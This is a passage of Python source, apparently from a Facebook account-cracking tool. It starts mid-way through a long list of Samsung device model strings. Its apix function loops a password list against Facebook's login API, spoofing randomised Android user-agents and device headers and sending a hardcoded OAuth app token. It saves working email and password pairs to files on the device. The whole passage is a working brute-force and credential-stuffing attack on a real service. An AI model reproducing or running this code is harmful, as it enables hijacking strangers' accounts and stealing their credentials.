-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
#
def apix(ids,passlist):
        try:
            global ok,loop
            sys.stdout.write(f'\r\r\033[1;37m [FIRE-CRACKING] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
            for pas in passlist:
                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                application_version_code=str(random.randint(000000000,999999999))
                fbs=random.choice(fbks)
                xxxxx=(f"GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
                gtt=random.choice(xxxxx)
                gttt=random.choice(xxxxx)
                android_version=str(random.randrange(6,13))
                ua_string = f'Davik/2.1.0 (linex; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=720,height=1280};'+f'FBLC/es_CU;FBRV/{str(application_version_code)};FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                device_id = str(uuid.uuid4())
                adid = str(uuid.uuid4())
                data = {"adid": "9e0f3002-43fc-4358-89f1-5622b403d502",
                    'email':ids,
                    'password':pas,
                    'cpl':'true',
                    'credentials_type':'device_based_login_password',
                    "source":"device_based_login",
                    'error_detail_type':'button_with_disabled',
                    'source':'login','format':'json',
                    'generate_session_cookies':'1',
                    'generate_analytics_claim':'1',
                    'generate_machine_id':'1',
                    "locale":"es_CU","client_country_code":"CU",
                    'device':gtt,
                    "device_id":"6e18861e-d578-4cfb-8728-528f1e4b90e7",
                    "method":"auth.login",
                    "fb_api_req_friendly_name": "authenticate",
                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                head = {
                    'content-type':'application/x-www-form-urlencoded',
                    'x-fb-sim-hni':str(random.randint(2e4,4e4)),
                    'x-fb-connection-type':'unknown',
                    'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    'User-Agent': 'Dalvik/2.1.0 Linux; U; Android 6.0.0; GT-I9300I Build/KTU84P) [FBAN/FB4A;FBAV/540.0.0.84.626;FBBV/169717250;FBDM/{density=4.0,width=1532,height=2560};FBLC/en_US;FBCR/Grameenphone;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9300I;FBSV/6.0.0;FBCA/armeabi-v7a:armeabi;]',
                    'x-fb-net-hni':str(random.randint(2e4,4e4)),
                    'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
                    'x-fb-connection-quality':'EXCELLENT',
                    'x-fb-friendly-name':'authenticate',
                    'accept-encoding':'gzip, deflate',
                    'x-fb-http-engine':     'Liger'}
                url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                q = json.loads(po)
                if 'session_key' in q:
                    print(f'\r\r\033[1;32m [FIRE-OK] '+ids+' | '+pas+'\033[1;97m')
                    open(f'/sdcard/FIRE-OK.txt','a').write(ids+'|'+pas+'\n')
                    #cek_apk(session,coki)
                    oks.append(ids)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    if 'y' in pcp:
                        print(f'\r\r\x1b[1;90m [FIRE-CP] '+ids+' | '+pas+'\033[1;97m')
                        open(f'/sdcard/FIRE-CP.txt', 'a').write(ids+'|'+pas+'\n')
                        cps.append(ids)
                        break
                    else:
                        open(f'/sdcard/FIRE-CP.txt','a').write(ids+'|'+pas+'\n')
                        break
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            time.sleep(10)
        except Exception as e:
            pass
		



approval()

